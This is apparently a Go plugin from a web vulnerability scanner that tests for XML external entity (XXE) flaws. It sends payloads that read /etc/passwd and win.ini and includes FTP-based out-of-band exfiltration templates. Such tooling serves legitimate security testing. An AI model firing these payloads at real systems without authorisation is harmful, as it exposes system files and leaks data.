package xxe

import (
	"errors"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"regexp"
	"strings"
	"time"

	"github.com/thoas/go-funk"
)

var DefaultProxy = ""
var Cert string
var Mkey string

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

//bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

func Xxe(args interface{}) (*util.ScanResult, bool, error) {
	var err error
	var Param layers.PluginParam
	ct := layers.CheckType{}
	Param.ParsePluginParams(args.(plugin.GroupData), ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	var xmlversion bool
	reg := `^\s*<\?xml`
	match, _ := regexp.MatchString(reg, Param.Body)
	if match {
		xmlversion = true
	}
	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
	}

	win_pl := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
	}

	//"application/xml;charset=UTF-8"
	if funk.Contains(Param.ContentType, "text/xml") {
		for _, pl := range payloads {
			if strings.ToUpper(Param.Method) == "POST" {
				req1, resp1, errs := sess.Post(Param.Url, Param.Headers, []byte(pl))
				if errs != nil {
					return nil, false, errs
				}
				body := string(resp1.Body())
				if funk.Contains(body, "root:[x*]:0:0:") {
					Result := util.VulnerableTcpOrUdpResult(Param.Url,
						"xxe Vulnerable",
						[]string{string(req1.String())},
						[]string{string(body)},
						"high",
						Param.Hostid)
					return Result, true, errs
				}
			}
		}

		//bind-xxe

		//无回显显示器
		// bind_payloads := []string{
		// 	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>`,
		// 	`<!DOCTYPE foo SYSTEM "{}">`,
		// }

		// for _, pl := range bind_payloads {
		// 	if xmlversion {
		// 		pl_ := xmlversion_text + "\r\n" + pl
		// 	}
		// 	info := "xxe_" + self.parser.getfilepath()
		// }

	}

	//<?xml version="1.0" encoding="utf-8"?>

	if funk.Contains(Param.ContentType, "application/xml") {

		var pl_ string
		if !xmlversion {
			pl_ = xmlversion_text
			logger.Debug(pl_)
		}
		// err := xml.Unmarshal([]byte(pl_), &blastIters)
		// if err != nil {
		// 	logger.Error("%v", err.Error())
		// }

		for _, pl := range win_pl {
			if strings.ToUpper(Param.Method) == "POST" {
				doc, err := util.ParseXMl([]byte(Param.Body))
				if err != nil {
					logger.Debug("%v", err.Error())
				}
				newbody, err := doc.WriteToBytes()
				if err != nil {
					logger.Debug("%v", err.Error())
				}

				newbody = []byte(strings.ReplaceAll(string(newbody), "&amp;content", "&content;"))
				npl := append([]byte(pl), newbody...)
				if strings.ToUpper(Param.Method) == "POST" {
					req1, resp1, errs := sess.Post(Param.Url, Param.Headers, []byte(npl))
					if errs != nil {
						return nil, false, errs
					}
					body := string(resp1.Body())
					if funk.Contains(body, "for 16-bit app") {
						Result := util.VulnerableTcpOrUdpResult(Param.Url,
							"xxe Vulnerable",
							[]string{string(req1.String())},
							[]string{string(body)},
							"high",
							Param.Hostid)
						return Result, true, errs
					}
				}
			}
		}
	}

	//如果都没有报出漏洞的话，尝试Blind测试
	//首先，开启两个

	return nil, false, err
}
